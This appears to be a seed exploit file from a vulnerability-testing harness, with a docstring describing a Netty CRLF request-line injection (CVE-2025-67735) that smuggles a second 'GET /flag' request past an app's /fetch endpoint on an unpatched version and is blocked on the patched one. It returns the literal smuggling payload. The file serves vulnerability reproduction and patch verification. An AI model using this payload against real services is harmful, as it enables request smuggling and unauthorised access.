#!/usr/bin/env python3
"""[GIVEN] CVE-2025-67735 seed exploit for netty-cve-2026-42578 (REAL-APP / EXTERNAL-HTTP form).

The classic vector: an attacker-influenced value flows into the request URI of an outbound Netty
DefaultHttpRequest, carrying a CRLF sequence. Here the value is delivered RAW (CRLF preserved) in
the POST body of an EXTERNAL HTTP request to the real Netty app's own `/fetch` endpoint; the app
forwards it and builds:

    new DefaultHttpRequest(HTTP_1_1, GET, "/a HTTP/1.1\\r\\nGET /flag?n=<nonce> HTTP/1.1\\r\\nX-Junk: 1")

encoded by the REAL HttpRequestEncoder and sent to the SEPARATE proxy sidecar over the network.

  V0 (netty 4.1.128.Final, pre-CVE-2025-67735): the constructor does NOT validate the request
        line, so the encoder writes the URI raw and a second "GET /flag" request line splits off ->
        the sidecar records the planted flag (REACHES).
  V1 (netty 4.1.129.Final, CVE-2025-67735 patched): DefaultHttpRequest's constructor runs
        HttpUtil.validateRequestLineTokens() and THROWS on the embedded CR/LF -> no bytes are ever
        sent -> the smuggled request never reaches the sidecar (BLOCKED). The block on V1 is
        specifically the request-line validation added by the CVE-2025-67735 fix.

`endpoint` = the app route; `hdr` = the attacker value (with a {nonce} slot the oracle fills and
URL-encodes before sending the external HTTP request).
"""
import secrets


def candidate():
    return {
        "id": "cve-2025-67735-uri-crlf",
        "mode": "seed",
        "endpoint": "/fetch",
        "hdr": "/a HTTP/1.1\r\nGET /flag?n={nonce} HTTP/1.1\r\nX-Junk: 1",
        "nonce": "seed" + secrets.token_hex(6),
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
